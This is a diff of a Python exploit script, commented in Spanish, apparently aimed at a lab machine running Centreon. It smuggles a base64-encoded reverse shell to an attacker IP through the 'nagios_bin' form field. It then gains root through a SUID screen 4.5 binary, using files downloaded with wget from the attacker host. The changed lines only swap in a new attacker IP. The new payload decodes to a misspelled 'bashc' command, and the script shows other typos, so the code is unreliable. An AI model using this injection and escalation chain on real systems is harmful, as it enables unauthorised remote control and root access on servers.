@@ -2,6 +2,7 @@
 # coding: utf-8
 
 # Este exploit + Privesc necesita de dos archivos relacionandos con SCREEN 4.5 privesc almacenado en la misma carpeta de la maquina
+# Hace falta cambiar la ip en el base64 malicioso y en el privesc abajo del todo
 
 import sys
 import time
@@ -58,7 +59,7 @@ def makeRequest(password):
                 'is_default[is_default]':'0',
                 'ssh_port':'22',
                 'init_script':'centengine',
-                'nagios_bin':'echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMzIvMTIzNCAwPiYxCg==|base64${IFS}-d|bash;',
+                'nagios_bin':'echo${IFS}YmFzaGMgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTQxLzEyMzQgMD4mMQo=|base64${IFS}-d|bash;',
                 'nagiostats_bin':'/usr/sbin/centenginestats',
                 'nagios_perfdata':'/var/log/centreon-engine/service-perfdata',
                 'centreonbroker_cfg_path':'/etc/centreon-broker',
@@ -109,8 +110,8 @@ if __name__ == '__main__':
         time.sleep(2)
 # Privesc atraves de el binario SUID SCREEN 4.5
         shell.sendline("cd /tmp")
-        shell.sendline("wget http://10.10.16.132/libhax.c")
-        shell.sendline("wget http://10.10.16.132/rootshell")
+        shell.sendline("wget http://10.10.15.141/libhax.c")
+        shell.sendline("wget http://10.10.15.141/rootshell")
         shell.sendlines("chmod +x libhax.c rottshell")
         shell.sendline("cd /etc")
         shell.sendline("umask 000")
